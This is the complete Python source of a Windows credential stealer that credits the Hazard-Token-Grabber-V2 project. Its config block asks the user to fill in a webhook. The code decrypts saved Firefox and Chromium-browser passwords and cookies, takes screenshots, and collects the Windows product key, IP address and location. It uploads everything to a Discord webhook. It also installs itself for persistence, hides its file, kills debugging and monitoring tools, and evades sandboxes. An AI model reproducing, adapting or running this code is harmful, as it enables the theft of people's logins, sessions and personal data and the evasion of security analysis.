import os
import re
import csv
import sys
import hmac
import json
import httpx
import winreg
import ctypes
import shutil
import psutil
import base64
import asyncio
import sqlite3
import zipfile
import threading
import subprocess
import win32crypt
from pathlib import Path
from PIL import ImageGrab
from struct import unpack
from tempfile import mkdtemp
from Crypto.Cipher import DES3, AES
from pyasn1.codec.der import decoder
from Crypto.Util.Padding import unpad
from hashlib import sha1, pbkdf2_hmac
from binascii import hexlify, unhexlify
from Crypto.Util.number import long_to_bytes
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

config = {
    # replace WEBHOOK_HERE with your webhook ↓↓
    'webhook': "WEBHOOK_HERE",
    # if you want the file to run at startup
    'startup': True,
    # if you want the file to hide itself after run
    'hide_self': True,
    # does it's best to prevent the program from being debugged and drastically reduces the changes of your webhook being found
    'anti_debug': True,
    # set to False if you don't want it to kill programs
    'kill_processes': True,
    # this list of programs will be killed if it detects that any of these are running, you can add more if you want
    'blackListedPrograms':
    [
        "httpdebuggerui",
        "wireshark",
        "fiddler",
        "regedit",
        "cmd",
        "taskmgr",
        "vboxservice",
        "df5serv",
        "processhacker",
        "vboxtray",
        "vmtoolsd",
        "vmwaretray",
        "ida64",
        "ollydbg",
        "pestudio",
        "vmwareuser",
        "vgauthservice",
        "vmacthlp",
        "x96dbg",
        "vmsrvc",
        "x32dbg",
        "vmusrvc",
        "prl_cc",
        "prl_tools",
        "xenservice",
        "qemu-ga",
        "joeboxcontrol",
        "ksdumperclient",
        "ksdumper",
        "joeboxserver"
    ]

}
Victim = os.getlogin()
Victim_pc = os.getenv("COMPUTERNAME")


class functions(object):

    @staticmethod
    def fetchConf(e: str) -> str or bool | None:
        return config.get(e)


class Data_Grabber(functions):
    def __init__(self):
        self.webhook = self.fetchConf('webhook')
        self.appdata = os.getenv("localappdata")
        self.roaming = os.getenv("appdata")
        self.dir = mkdtemp()
        self.startup_loc = self.roaming + \
            "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
        self.sep = os.sep

        os.makedirs(self.dir, exist_ok=True)

    def try_extract(func):
        def wrapper(*args, **kwargs):
            try:
                func(*args, **kwargs)
            except Exception:
                pass
        return wrapper

    async def init(self):
        if self.fetchConf('anti_debug'):
            if AntiDebug().inVM:
                os._exit(0)
        function_list = [self.screenshot, self.main,
                         self.firefoxCookies, self.chCookies, self.chromium_pasw]
        if self.fetchConf('hide_self'):
            function_list.append(self.hide)

        if self.fetchConf('kill_processes'):
            await self.killProcesses()

        if self.fetchConf('startup'):
            function_list.append(self.startup)

        for func in function_list:
            process = threading.Thread(target=func, daemon=True)
            process.start()
        for t in threading.enumerate():
            try:
                t.join()
            except RuntimeError:
                continue
        self.finish()
        shutil.rmtree(self.dir)

    def hide(self):
        ctypes.windll.kernel32.SetFileAttributesW(sys.argv[0], 2)

    def startup(self):
        try:
            shutil.copy2(sys.argv[0], self.startup_loc)
        except Exception:
            pass

    async def killProcesses(self):
        blackListedPrograms = self.fetchConf('blackListedPrograms')
        for proc in psutil.process_iter():
            if any(procstr in proc.name().lower() for procstr in blackListedPrograms):
                try:
                    proc.kill()
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    pass

    def getProductValues(self):
        try:
            wkey = subprocess.check_output(
                r"powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform' -Name BackupProductKeyDefault", creationflags=0x08000000).decode().rstrip()
        except Exception:
            wkey = "N/A (Likely Pirated)"
        try:
            productName = subprocess.check_output(
                r"powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion' -Name ProductName", creationflags=0x08000000).decode().rstrip()
        except Exception:
            productName = "N/A"
        return [productName, wkey]

    def getShortLE(d, a):
        return unpack('<H', (d)[a:a+2])[0]

    def getLongBE(d, a):
        return unpack('>L', (d)[a:a+4])[0]

    def printASN1(self, d, l, rl):
        type = d[0]
        length = d[1]
        if length & 0x80 > 0:
            length = d[2]
            skip = 1
        else:
            skip = 0
        if type == 0x30:
            seqLen = length
            readLen = 0
            while seqLen > 0:
                len2 = self.printASN1(d[2+skip+readLen:], seqLen, rl+1)
                seqLen = seqLen - len2
                readLen = readLen + len2
            return length+2
        elif type == 6:
            return length+2
        elif type == 4:
            return length+2
        elif type == 5:
            return length+2
        elif type == 2:
            return length+2
        else:
            if length == l-2:
                return length

    def readBsddb(self, name, options):
        f = open(name, 'rb')
        header = f.read(4*15)
        magic = self.getLongBE(header, 0)
        if magic != 0x61561:
            print('bad magic number')
            sys.exit()
        version = self.getLongBE(header, 4)
        if version != 2:
            print('bad version, !=2 (1.85)')
            sys.exit()
        pagesize = self.getLongBE(header, 12)
        nkeys = self.getLongBE(header, 0x38)
        if options.verbose > 1:
            print('pagesize=0x%x' % pagesize)
            print('nkeys=%d' % nkeys)

        readkeys = 0
        page = 1
        nval = 0
        val = 1
        db1 = []
        while (readkeys < nkeys):
            f.seek(pagesize*page)
            offsets = f.read((nkeys+1) * 4 + 2)
            offsetVals = []
            i = 0
            nval = 0
            val = 1
            keys = 0
            while nval != val:
                keys += 1
                key = self.getShortLE(offsets, 2+i)
                val = self.getShortLE(offsets, 4+i)
                nval = self.getShortLE(offsets, 8+i)
                offsetVals.append(key + pagesize*page)
                offsetVals.append(val + pagesize*page)
                readkeys += 1
                i += 4
            offsetVals.append(pagesize*(page+1))
            valKey = sorted(offsetVals)
            for i in range(keys*2):
                f.seek(valKey[i])
                data = f.read(valKey[i+1] - valKey[i])
                db1.append(data)
            page += 1
        f.close()
        db = {}

        for i in range(0, len(db1), 2):
            db[db1[i+1]] = db1[i]
        if options.verbose > 1:
            for i in db:
                print('%s: %s' % (repr(i), hexlify(db[i])))
        return db

    def decryptMoz3DES(globalSalt,  entrySalt, encryptedData, options):
        hp = sha1(globalSalt).digest()
        pes = entrySalt + b'\x00'*(20-len(entrySalt))
        chp = sha1(hp+entrySalt).digest()
        k1 = hmac.new(chp, pes+entrySalt, sha1).digest()
        tk = hmac.new(chp, pes, sha1).digest()
        k2 = hmac.new(chp, tk+entrySalt, sha1).digest()
        k = k1+k2
        iv = k[-8:]
        key = k[:24]
        if options.verbose > 0:
            print('key= %s, iv=%s' % (hexlify(key), hexlify(iv)))
        return DES3.new(key, DES3.MODE_CBC, iv).decrypt(encryptedData)

    def decodeLoginData(self, data):
        asn1data = decoder.decode(
            base64.b64decode(data))
        key_id = asn1data[0][0].asOctets()
        iv = asn1data[0][1][1].asOctets()
        ciphertext = asn1data[0][2].asOctets()
        return key_id, iv, ciphertext

    def getLoginData(self, options):
        logins = []
        sqlite_file = options['directory'] / 'signons.sqlite'
        json_file = options['directory'] / 'logins.json'
        if json_file.exists():
            loginf = open(json_file, 'r').read()
            jsonLogins = json.loads(loginf)
            if 'logins' not in jsonLogins:
                print('error: no \'logins\' key in logins.json')
                return []
            for row in jsonLogins['logins']:
                encUsername = row['encryptedUsername']
                encPassword = row['encryptedPassword']
                logins.append((self.decodeLoginData(encUsername),
                               self.decodeLoginData(encPassword), row['hostname']))
            return logins
        elif sqlite_file.exists():
            print('sqlite')
            conn = sqlite3.connect(sqlite_file)
            c = conn.cursor()
            c.execute("SELECT * FROM moz_logins;")
            for row in c:
                encUsername = row[6]
                encPassword = row[7]
                if options['verbose'] > 1:
                    print(row[1], encUsername, encPassword)
                logins.append((self.decodeLoginData(encUsername),
                               self.decodeLoginData(encPassword), row[1]))
            return logins
        else:
            print('missing logins.json or signons.sqlite')

    CKA_ID = unhexlify('f8000000000000000000000000000001')

    def extractSecretKey(self,  keyData, options):
        pwdCheck = keyData[b'password-check']
        entrySaltLen = pwdCheck[1]
        entrySalt = pwdCheck[3: 3+entrySaltLen]
        encryptedPasswd = pwdCheck[-16:]
        globalSalt = keyData[b'global-salt']
        cleartextData = self.decryptMoz3DES(
            globalSalt,  entrySalt, encryptedPasswd, options)
        if cleartextData != b'password-check\x02\x02':
            print(
                'password check error, Master Password is certainly used, please provide it with -p option')
            sys.exit()

        if self.CKA_ID not in keyData:
            return None
        privKeyEntry = keyData[self.CKA_ID]
        saltLen = privKeyEntry[1]
        nameLen = privKeyEntry[2]
        privKeyEntryASN1 = decoder.decode(privKeyEntry[3+saltLen+nameLen:])
        data = privKeyEntry[3+saltLen+nameLen:]
        self.printASN1(data, len(data), 0)

        entrySalt = privKeyEntryASN1[0][0][1][0].asOctets()
        privKeyData = privKeyEntryASN1[0][1].asOctets()
        privKey = self.decryptMoz3DES(
            globalSalt,  entrySalt, privKeyData, options)

        self.printASN1(privKey, len(privKey), 0)

        privKeyASN1 = decoder.decode(privKey)
        prKey = privKeyASN1[0][2].asOctets()
        print('decoding %s' % hexlify(prKey))
        self.printASN1(prKey, len(prKey), 0)

        prKeyASN1 = decoder.decode(prKey)
        id = prKeyASN1[0][1]
        key = long_to_bytes(prKeyASN1[0][3])
        if options.verbose > 0:
            print('key=%s' % (hexlify(key)))
        return key

    def decryptPBE(self, decodedItem,  globalSalt, options):
        pbeAlgo = str(decodedItem[0][0][0])
        if pbeAlgo == '1.2.840.113549.1.12.5.1.3':

            entrySalt = decodedItem[0][0][1][0].asOctets()
            cipherT = decodedItem[0][1].asOctets()
            print('entrySalt:', hexlify(entrySalt))
            key = self.decryptMoz3DES(
                globalSalt,  entrySalt, cipherT, options)
            print(hexlify(key))
            return key[:24], pbeAlgo
        elif pbeAlgo == '1.2.840.113549.1.5.13':
            assert str(decodedItem[0][0][1][0][0]) == '1.2.840.113549.1.5.12'
            assert str(decodedItem[0][0][1][0][1][3]
                       [0]) == '1.2.840.113549.2.9'
            assert str(decodedItem[0][0][1][1][0]) == '2.16.840.1.101.3.4.1.42'
            entrySalt = decodedItem[0][0][1][0][1][0].asOctets()
            iterationCount = int(decodedItem[0][0][1][0][1][1])
            keyLength = int(decodedItem[0][0][1][0][1][2])
            assert keyLength == 32

            k = sha1(globalSalt).digest()
            key = pbkdf2_hmac('sha256', k, entrySalt,
                              iterationCount, dklen=keyLength)

            iv = b'\x04\x0e'+decodedItem[0][0][1][1][1].asOctets()
            cipherT = decodedItem[0][1].asOctets()
            clearText = AES.new(key, AES.MODE_CBC, iv).decrypt(cipherT)

            return clearText, pbeAlgo

    def getKey(self, directory, options):
        if (directory / 'key4.db').exists():
            conn = sqlite3.connect(directory / 'key4.db')
            c = conn.cursor()
            c.execute("SELECT item1,item2 FROM metadata WHERE id = 'password';")
            row = c.fetchone()
            globalSalt = row[0]
            item2 = row[1]
            self.printASN1(item2, len(item2), 0)
            decodedItem2 = decoder.decode(item2)
            clearText, algo = self.decryptPBE(
                decodedItem2,  globalSalt, options)

            if clearText == b'password-check\x02\x02':
                c.execute("SELECT a11,a102 FROM nssPrivate;")
                for row in c:
                    if row[0] != None:
                        break
                a11 = row[0]
                a102 = row[1]
                if a102 == self.CKA_ID:
                    self.printASN1(a11, len(a11), 0)
                    decoded_a11 = decoder.decode(a11)
                    clearText, algo = self.decryptPBE(
                        decoded_a11,  globalSalt, options)
                    return clearText[:24], algo
            return None, None
        elif (directory / 'key3.db').exists():
            keyData = self.readBsddb(directory / 'key3.db', options)
            key = self.extractSecretKey(keyData)
            return key, '1.2.840.113549.1.12.5.1.3'
        else:
            print('cannot find key4.db or key3.db')
            return None, None

    @try_extract
    def main(self):
        profilesPath = self.roaming + '\\Mozilla\\Firefox\\Profiles'
        mozillaProfiles = os.listdir(profilesPath)
        for profile in mozillaProfiles:
            options = {
                'verbose': 0,
                'directory': Path(profilesPath + os.sep + profile)
            }
            key, algo = self.getKey(options['directory'], options)
            if key == None:
                continue
            logins = self.getLoginData(options)
            if algo == '1.2.840.113549.1.12.5.1.3' or algo == '1.2.840.113549.1.5.13':
                with open(self.dir + os.sep + 'firefox_pass.csv', mode='a', newline='', encoding='utf-8') as decrypt_password_file:
                    csv_writer = csv.writer(
                        decrypt_password_file, delimiter=',')
                    csv_writer.writerow(["url", "username", "password"])
                    for i in logins:
                        assert i[0][0] == self.CKA_ID
                        url = '%20s:' % (i[2])
                        iv = i[0][1]
                        ciphertext = i[0][2]
                        name = str(unpad(DES3.new(key, DES3.MODE_CBC, iv).decrypt(
                            ciphertext), 8), encoding="utf-8")
                        iv = i[1][1]
                        ciphertext = i[1][2]
                        passw = str(unpad(DES3.new(key, DES3.MODE_CBC, iv).decrypt(
                            ciphertext), 8), encoding="utf-8")
                        csv_writer.writerow([url, name, passw])

    @try_extract
    def firefoxCookies(self):
        profilesPath = self.roaming + '\\Mozilla\\Firefox\\Profiles'
        mozillaProfiles = os.listdir(profilesPath)
        path = self.roaming + '\\Mozilla\\Firefox\\Profiles'
        for profile in mozillaProfiles:
            try:
                conn = sqlite3.connect(
                    path + os.sep + profile + os.sep + "\\cookies.sqlite")
                res = conn.execute("SELECT * FROM moz_cookies").fetchall()
                conn.close()
                with open(self.dir + os.sep + f'moz_{profile}_cookies.csv', mode='w', newline='', encoding='utf-8') as decrypt_password_file:
                    csv_writer = csv.writer(
                        decrypt_password_file, delimiter=',')
                    for row in res:
                        x = list(row)
                        csv_writer.writerow(x)

            except Exception as e:
                print(e)

    def decryptString(self, key, data):
        nonce, cipherbytes = data[3:15], data[15:]
        aesgcm = AESGCM(key)
        plainbytes = aesgcm.decrypt(nonce, cipherbytes, None)
        plaintext = plainbytes.decode('utf-8')

        return plaintext

    def getKeyCH(self, path):
        LocalState = path + r'\Local State'
        with open(LocalState, 'r', encoding='utf-8') as f:
            base64_encrypted_key = json.load(f)['os_crypt']['encrypted_key']
        encrypted_key_with_header = base64.b64decode(base64_encrypted_key)
        encrypted_key = encrypted_key_with_header[5:]
        key = win32crypt.CryptUnprotectData(
            encrypted_key, None, None, None, 0)[1]
        return key

    def getChromeCookie(self, path, profile, name):
        cookiepath = path + os.sep + profile + r"\Network\Cookies"
        if not os.path.exists(cookiepath):
            cookiepath = path + os.sep + profile + r"\Cookies"

        sql = f"select * from cookies"

        try:
            conn = sqlite3.connect(cookiepath)
            conn.text_factory = bytes
            res = conn.execute(sql).fetchall()
            conn.close()
        except Exception as e:
            print(e)
        key = self.getKeyCH(path)
        with open(self.dir + os.sep + f'{name}_cookies.csv', mode='a', newline='', encoding='utf-8') as decrypt_password_file:
            csv_writer = csv.writer(decrypt_password_file, delimiter=',')
            csv_writer.writerow(["creation_utc", "host_key", "top_frane_site_key", "name", "value", "encrypted_value", "path", "expires_utc", "is_secure",
                                "is_httponly", "last_access_utc", "has_expires", "is_persistent", "priority", "samesite", "source_scheme", "source_port", "is_same_party"])
            for row in res:
                x = list(row)
                for num in range(0, len(x)):
                    try:
                        x[num] = str(x[num], encoding="utf-8")
                    except:
                        pass
                x[5] = self.decryptString(key, x[5])
                csv_writer.writerow(x)

    def paths(self):
        paths = {
            'Opera': self.roaming + '\\Opera Software\\Opera Stable',
            'Opera GX': self.roaming + '\\Opera Software\\Opera GX Stable',
            'Vivaldi': self.appdata + '\\Vivaldi\\User Data',
            'Chrome': self.appdata + '\\Google\\Chrome\\User Data',
            'Microsoft Edge': self.appdata + '\\Microsoft\\Edge\\User Data',
            'Uran': self.appdata + '\\uCozMedia\\Uran\\User Data',
            'Yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data',
            'Brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
            'Iridium': self.appdata + '\\Iridium\\User Data',
            'Firefox': self.roaming + '\\Mozilla\\Firefox\\Profiles'
        }
        return paths

    def userBrowserss(self):
        aKey = r"SOFTWARE\Clients\StartMenuInternet"
        aReg = winreg.ConnectRegistry(None, winreg.HKEY_LOCAL_MACHINE)
        browsers = ['Opera', 'Opera GX', 'Vivaldi', 'Chrome',
                    'Microsoft Edge', 'Uran', 'Yandex', 'Brave', 'Iridium', 'Firefox']
        aKey = winreg.OpenKey(aReg, aKey)

        userBrowsers = []
        for i in range(1024):
            try:
                asubkey_name = winreg.EnumKey(aKey, i)
                userBrowsers.append(asubkey_name)
            except EnvironmentError:
                break

        used = []
        for digit in range(0, len(userBrowsers)):
            for digita in range(0, len(browsers)):
                if browsers[digita] in userBrowsers[digit]:
                    used.append(browsers[digita])

        return used

    def browserPaths(self):
        usedPaths = []
        paths = self.userBrowserss()
        for browser in paths:
            if browser != 'Firefox':
                usedPaths.append(self.paths()[browser])
        return usedPaths

    def without(self):
        browsers = []
        for browser in self.userBrowserss():
            if browser != 'Firefox':
                browsers.append(browser)
        return browsers

    def profiles(self, browser):
        chromeProfiles = []
        files = os.listdir(self.paths()[browser])
        was = False
        for num in range(11):
            for file in files:
                if 'default' == file.lower() and was == False:
                    chromeProfiles.append(file)
                    was = True
                if file.lower() == 'profile ' + str(num):
                    chromeProfiles.append(file)
        return chromeProfiles

    @try_extract
    def chCookies(self):
        num = -1
        for path in self.browserPaths():
            num += 1
            name = self.without()[num]
            for profile in self.profiles(name):
                self.getChromeCookie(path, profile, name)

    def screenshot(self):
        image = ImageGrab.grab(
            bbox=None,
            include_layered_windows=False,
            all_screens=True,
            xdisplay=None
        )
        image.save(self.dir + "\\Screenshot.png")
        image.close()

    def get_secret_key(self):
        try:
            with open(CHROME_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
                local_state = f.read()
                local_state = json.loads(local_state)
            secret_key = base64.b64decode(
                local_state["os_crypt"]["encrypted_key"])
            secret_key = secret_key[5:]
            secret_key = win32crypt.CryptUnprotectData(
                secret_key, None, None, None, 0)[1]
            return secret_key
        except Exception as e:
            print("%s" % str(e))
            print("[ERR] Chrome secretkey cannot be found")
            return None

    def decrypt_payload(self, cipher, payload):
        return cipher.decrypt(payload)

    def generate_cipher(self, aes_key, iv):
        return AES.new(aes_key, AES.MODE_GCM, iv)

    def decrypt_password(self, ciphertext, secret_key):
        try:
            initialisation_vector = ciphertext[3:15]
            encrypted_password = ciphertext[15:-16]
            cipher = self.generate_cipher(secret_key, initialisation_vector)
            decrypted_pass = self.decrypt_payload(cipher, encrypted_password)
            decrypted_pass = decrypted_pass.decode()
            return decrypted_pass
        except Exception as e:
            print("%s" % str(e))
            print(
                "[ERR] Unable to decrypt, Chrome version <80 not supported. Please check.")
            return ""

    def get_db_connection(self, chrome_path_login_db):
        try:
            shutil.copy2(chrome_path_login_db, "Loginvault.db")
            return sqlite3.connect("Loginvault.db")
        except Exception as e:
            print("%s" % str(e))
            print("[ERR] Chrome database cannot be found")
            return None

    def mainDecrypt(self, paths, names):
        num = -1
        for path in paths:
            num += 1
            global CHROME_PATH_LOCAL_STATE
            CHROME_PATH_LOCAL_STATE = path + '\\Local State'
            global CHROME_PATH
            CHROME_PATH = path
            try:
                with open(self.dir + os.sep + f'{names[num]}_pasw.csv', mode='w', newline='', encoding='utf-8') as decrypt_password_file:
                    csv_writer = csv.writer(
                        decrypt_password_file, delimiter=',')
                    csv_writer.writerow(
                        ["index", "url", "username", "password"])
                    secret_key = self.get_secret_key()
                    folders = [element for element in os.listdir(
                        CHROME_PATH) if re.search("^Profile*|^Default$", element) != None]
                    for folder in folders:
                        chrome_path_login_db = os.path.normpath(
                            r"%s\%s\Login Data" % (CHROME_PATH, folder))
                        conn = self.get_db_connection(chrome_path_login_db)
                        if(secret_key and conn):
                            cursor = conn.cursor()
                            cursor.execute(
                                "SELECT action_url, username_value, password_value FROM logins")
                            for index, login in enumerate(cursor.fetchall()):
                                url = login[0]
                                username = login[1]
                                ciphertext = login[2]
                                if(url != "" and username != "" and ciphertext != ""):
                                    decrypted_password = self.decrypt_password(
                                        ciphertext, secret_key)
                                    csv_writer.writerow(
                                        [index, url, username, decrypted_password])
                            cursor.close()
                            conn.close()
                            os.remove("Loginvault.db")
            except Exception as e:
                print("[ERR] " % str(e))

    @try_extract
    def chromium_pasw(self):
        self.mainDecrypt(self.browserPaths(), self.without())

    def finish(self):
        w = self.getProductValues()
        wname = w[0].replace(" ", "᠎ ")
        wkey = w[1].replace(" ", "᠎ ")
        ram = str(psutil.virtual_memory()[0]/1024 ** 3).split(".")[0]
        disk = str(psutil.disk_usage('/')[0]/1024 ** 3).split(".")[0]
        data = httpx.get("https://ipinfo.io/json").json()
        ip = data.get('ip')
        city = data.get('city')
        country = data.get('country')
        region = data.get('region')
        org = data.get('org')
        googlemap = "https://www.google.com/maps/search/google+map++" + \
            data.get('loc')

        _zipfile = os.path.join(
            self.appdata, f'Data-Grabber-[{Victim}].zip')
        zipped_file = zipfile.ZipFile(_zipfile, "w", zipfile.ZIP_DEFLATED)
        abs_src = os.path.abspath(self.dir)
        for dirname, _, files in os.walk(self.dir):
            for filename in files:
                absname = os.path.abspath(os.path.join(dirname, filename))
                arcname = absname[len(abs_src) + 1:]
                zipped_file.write(absname, arcname)
        zipped_file.close()
        files_found = ''
        for f in os.listdir(self.dir):
            files_found += f"・{f}\n"
        fileCount = f"{len(files)} Files Found: "
        embed = {
            'username'
            'avatar_url': 'https://raw.githubusercontent.com/Rdimo/images/master/Hazard-Token-Grabber-V2/Big_hazard.gif',
            'embeds': [
                {
                    'author': {
                        'name': f'*{Victim}* Just ran Data Grabber',
                        'url': 'https://github.com/Rdimo/Hazard-Token-Grabber-V2',
                        'icon_url': 'https://raw.githubusercontent.com/Rdimo/images/master/Hazard-Token-Grabber-V2/Small_hazard.gif'
                    },
                    'color': 16119101,
                    'description': f'[Google Maps Location]({googlemap})',
                    'fields': [
                        {
                            'name': '\u200b',
                            'value': f'''```fix
                                IP:᠎ {ip.replace(" ", "᠎ ") if ip else "N/A"}
                                Org:᠎ {org.replace(" ", "᠎ ") if org else "N/A"}
                                City:᠎ {city.replace(" ", "᠎ ") if city else "N/A"}
                                Region:᠎ {region.replace(" ", "᠎ ") if region else "N/A"}
                                Country:᠎ {country.replace(" ", "᠎ ") if country else "N/A"}```
                            '''.replace(' ', ''),
                            'inline': True
                        },
                        {
                            'name': '\u200b',
                            'value': f'''```fix
                                PCName: {Victim_pc.replace(" ", "᠎ ")}
                                WinKey:᠎ {wkey}
                                Platform:᠎ {wname}
                                DiskSpace:᠎ {disk}GB
                                Ram:᠎ {ram}GB```
                            '''.replace(' ', ''),
                            'inline': True
                        },
                        {
                            'name': fileCount,
                            'value': f'''```ini
                                [
                                {files_found.strip()}
                                ]```
                            '''.replace(' ', ''),
                            'inline': False
                        }
                    ]
                }
            ]
        }
        httpx.post(self.webhook, json=embed)
        with open(_zipfile, 'rb') as f:
            httpx.post(self.webhook, files={'upload_file': f})
        os.remove(_zipfile)


class AntiDebug(functions):
    inVM = False

    def __init__(self):
        self.processes = list()

        self.blackListedUsers = ["WDAGUtilityAccount", "Abby", "Peter Wilson", "hmarc", "patex", "JOHN-PC", "RDhJ0CNFevzX", "kEecfMwgj", "Frank",
                                 "8Nl0ColNQ5bq", "Lisa", "John", "george", "PxmdUOpVyx", "8VizSM", "w0fjuOVmCcP5A", "lmVwjj9b", "PqONjHVwexsS", "3u2v9m8", "Julia", "HEUeRzl", ]
        self.blackListedPCNames = ["BEE7370C-8C0C-4", "DESKTOP-NAKFFMT", "WIN-5E07COS9ALR", "B30F0242-1C6A-4", "DESKTOP-VRSQLAG", "Q9IATRKPRH", "XC64ZB", "DESKTOP-D019GDM", "DESKTOP-WI8CLET", "SERVER1", "LISA-PC", "JOHN-PC",
                                   "DESKTOP-B0T93D6", "DESKTOP-1PYKP29", "DESKTOP-1Y2433R", "WILEYPC", "WORK", "6C4E733F-C2D9-4", "RALPHS-PC", "DESKTOP-WG3MYJS", "DESKTOP-7XC6GEZ", "DESKTOP-5OV9S0O", "QarZhrdBpj", "ORELEEPC", "ARCHIBALDPC", "JULIA-PC", "d1bnJkfVlH", ]
        self.blackListedHWIDS = ["7AB5C494-39F5-4941-9163-47F54D6D5016", "032E02B4-0499-05C3-0806-3C0700080009", "03DE0294-0480-05DE-1A06-350700080009", "11111111-2222-3333-4444-555555555555", "6F3CA5EC-BEC9-4A4D-8274-11168F640058", "ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548", "4C4C4544-0050-3710-8058-CAC04F59344A", "00000000-0000-0000-0000-AC1F6BD04972", "00000000-0000-0000-0000-000000000000", "5BD24D56-789F-8468-7CDC-CAA7222CC121", "49434D53-0200-9065-2500-65902500E439", "49434D53-0200-9036-2500-36902500F022", "777D84B3-88D1-451C-93E4-D235177420A7", "49434D53-0200-9036-2500-369025000C65",
                                 "B1112042-52E8-E25B-3655-6A4F54155DBF", "00000000-0000-0000-0000-AC1F6BD048FE", "EB16924B-FB6D-4FA1-8666-17B91F62FB37", "A15A930C-8251-9645-AF63-E45AD728C20C", "67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3", "C7D23342-A5D4-68A1-59AC-CF40F735B363", "63203342-0EB0-AA1A-4DF5-3FB37DBB0670", "44B94D56-65AB-DC02-86A0-98143A7423BF", "6608003F-ECE4-494E-B07E-1C4615D1D93C", "D9142042-8F51-5EFF-D5F8-EE9AE3D1602A", "49434D53-0200-9036-2500-369025003AF0", "8B4E8278-525C-7343-B825-280AEBCD3BCB", "4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27", "79AF5279-16CF-4094-9758-F88A616D81B4", ]

        for func in [self.listCheck, self.registryCheck, self.specsCheck]:
            process = threading.Thread(target=func, daemon=True)
            self.processes.append(process)
            process.start()
        for t in self.processes:
            try:
                t.join()
            except RuntimeError:
                continue

    def programExit(self):
        self.__class__.inVM = True

    def programKill(self, proc):
        try:
            os.system(f"taskkill /F /T /IM {proc}")
        except (PermissionError, InterruptedError, ChildProcessError, ProcessLookupError):
            pass

    def listCheck(self):
        for path in [r'D:\Tools', r'D:\OS2', r'D:\NT3X']:
            if os.path.exists(path):
                self.programExit()

        for user in self.blackListedUsers:
            if Victim == user:
                self.programExit()

        for pcName in self.blackListedPCNames:
            if Victim_pc == pcName:
                self.programExit()

        try:
            myHWID = subprocess.check_output(
                r"wmic csproduct get uuid", creationflags=0x08000000).decode().split('\n')[1].strip()
        except Exception:
            myHWID = ""
        for hwid in self.blackListedHWIDS:
            if myHWID == hwid:
                self.programExit()

    def specsCheck(self):
        ram = str(psutil.virtual_memory()[0]/1024 ** 3).split(".")[0]
        if int(ram) <= 3:
            self.programExit()
        disk = str(psutil.disk_usage('/')[0]/1024 ** 3).split(".")[0]
        if int(disk) <= 50:
            self.programExit()
        if int(psutil.cpu_count()) <= 1:
            self.programExit()

    def registryCheck(self):
        reg1 = os.system(
            "REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\DriverDesc 2> nul")
        reg2 = os.system(
            "REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\ProviderName 2> nul")
        if (reg1 and reg2) != 1:
            self.programExit()

        handle = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                                'SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum')
        try:
            reg_val = winreg.QueryValueEx(handle, '0')[0]

            if ("VMware" or "VBOX") in reg_val:
                self.programExit()
        finally:
            winreg.CloseKey(handle)


if __name__ == "__main__" and os.name == "nt":
    asyncio.run(Data_Grabber().init())
